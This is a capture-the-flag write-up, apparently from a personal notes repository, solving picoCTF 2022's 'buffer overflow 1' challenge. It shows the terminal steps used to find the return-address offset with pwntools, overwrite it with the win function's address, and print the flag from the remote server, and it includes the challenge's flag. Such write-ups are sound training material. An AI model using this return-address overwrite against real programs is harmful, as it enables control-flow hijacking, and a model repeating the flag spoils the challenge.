**Descripcion**

Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/251/vuln).You can view source [here](https://artifacts.picoctf.net/c/251/vuln.c). And connect with it using `nc saturn.picoctf.net 53794`

**Solucion**
```bash
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_1]
└─$ echo 'flag{dummie}' > flag.txt
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_1]
└─$ objdump -D vuln -M intel | grep '<win>'      
080491f6 <win>:
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'| ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x8049300
zsh: done                echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | 
zsh: segmentation fault  ./vuln
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBB'| ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x424242
zsh: done                echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBB' | 
zsh: segmentation fault  ./vuln
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB'| ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x42424242
zsh: done                echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB' | 
zsh: segmentation fault  ./vuln
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_1]
└─$ echo ''aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa''| ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'| ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
flag{dummie}
zsh: done                echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'| nc saturn.picoctf.net 53794
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_2e53b270}                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_1]
└─$ 


```

```bash
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclic_find(0x6161616c)
44
>>> p32(080491f6)
File "<stdin>", line 1
    p32(080491f6)
        ^
SyntaxError: leading zeros in decimal integer literals are not permitted; use an 0o prefix for octal integers
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> 'A'*44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> 

```

picoCTF{addr3ss3s_ar3_3asy_2e53b270} 

**Notas Adicionales**